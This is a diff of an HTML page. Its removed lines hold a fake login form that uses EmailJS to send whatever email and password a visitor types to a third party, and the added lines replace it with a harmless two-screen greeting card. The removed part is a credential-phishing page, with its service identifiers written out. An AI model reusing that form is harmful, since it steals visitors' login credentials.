@@ -1,140 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations!</title>
+    <style>
+        /* Overall Page Styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0c20; /* Dark premium background */
+            background: linear-gradient(to right, #141026, #0f0c20, #06040a);
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            text-align: center;
+        }
+        
+        /* Container Card */
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 90%;
+            width: 400px;
+            transition: all 0.5s ease-in-out;
+        }
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+        /* Message text with glow effect */
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 30px;
+            font-weight: 700;
+            line-height: 1.4;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.6);
+            color: #00ffcc;
+            animation: fadeIn 0.8s ease-in-out;
+        }
 
-<script>
-(function(){
-emailjs.init("5ijt6R7KPYcuCtNvK");
-})();
+        /* Screen 2 changes color for a fresh vibe */
+        .screen-2 h1 {
+            color: #ff3366;
+            text-shadow: 0 0 10px rgba(ff, 33, 102, 0.6);
+        }
 
-function sendLogin(e){
-e.preventDefault();
+        /* Next Button Styling */
+        .btn {
+            background: linear-gradient(45deg, #00ffcc, #0099ff);
+            color: #000;
+            border: none;
+            padding: 12px 35px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4);
+            transition: all 0.3s ease;
+            outline: none;
+        }
 
-emailjs.send("service_g9hb3t6","template_e9aw4ub",{
-email: document.getElementById("email").value,
-password: document.getElementById("password").value
-})
-.then(function(){
-alert("Login Request Sent Successfully!");
-});
-}
-</script>
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 255, 204, 0.7);
+        }
 
-<style>
+        .btn:active {
+            transform: translateY(1px);
+        }
 
-body{
-margin:0;
-font-family:Arial;
-.profile-circle{
-width:90px;
-height:90px;
-border-radius:50%;
-overflow:hidden;
-position:absolute;
-top:-0px;
-left:50%;
-transform:translateX(-50%);
-border:5px solid white;
-}
+        /* Smooth Hide/Show classes */
+        .hidden {
+            display: none !important;
+        }
 
-.profile-circle img{
-width:100%;
-height:100%;
-object-fit:cover;
-  .top-text{
-font-size:16px;
-color:#333;
-margin-top:40px;
-margin-bottom:5px;
-font-weight:bold;
-  }
-}
-background:linear-gradient(180deg,#c000ff,#7a00ff);
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-}
-
-.card{
-width:340px;
-background:#f3f3f3;
-border-radius:20px;
-padding:30px;
-text-align:center;
-box-shadow:0 10px 25px rgba(0,0,0,0.2);
-}
-
-input{
-width:90%;
-padding:14px;
-margin:10px 0;
-border-radius:10px;
-border:2px solid #ddd;
-font-size:15px;
-}
-
-button{
-width:95%;
-padding:14px;
-margin-top:15px;
-border:none;
-border-radius:10px;
-background:#ff9800;
-color:white;
-font-size:16px;
-cursor:pointer;
-}
-
-button:hover{
-opacity:0.9;
-}.top-image{
-display:flex;
-justify-content:center;
-margin-top:-40px; /* ऊपर लाने के लिए */
-margin-bottom:10px;
-}
-
-.top-image img{
-width:80px;
-height:80px;
-border-radius:50%;
-border:4px solid white;
-object-fit:cover;
-box-shadow:0 0 10px rgba(0,0,0,0.3);
-  }
-
-</style>
-
+        /* Simple Fade In Animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="card">
-<div class="profile-circle">
-<img src="Screenshot_20260317_010810~2.jpg">
-</div>
-  <div class="top-image">
-<img src="Screenshot_2026_0606_164236.png">
-  </div>
-  <p class="top-text">Enter Your Username Or Password</p>
-<h2>Login</h2>
+    <div id="screen1" class="card">
+        <h1>Naya Pyar Mubarak Ho Aapko ❤️</h1>
+        <button class="btn" onclick="showNextScreen()">Next</button>
+    </div>
 
-<form onsubmit="sendLogin(event)">
+    <div id="screen2" class="card screen-2 hidden">
+        <h1>Naya Yaar Mubarak Ho Aapko ✨</h1>
+    </div>
 
-<input type="text" id="email" placeholder="email" required>
-
-<input type="password" id="password" placeholder="password" required>
-
-<button type="submit">Login</button>
-
-</form>
-
-</div>
+    <script>
+        // Function to switch between screens smoothly
+        function showNextScreen() {
+            const screen1 = document.getElementById('screen1');
+            const screen2 = document.getElementById('screen2');
+            
+            // Hide first screen
+            screen1.classList.add('hidden');
+            
+            // Show second screen
+            screen2.classList.remove('hidden');
+        }
+    </script>
 
 </body>
 </html>
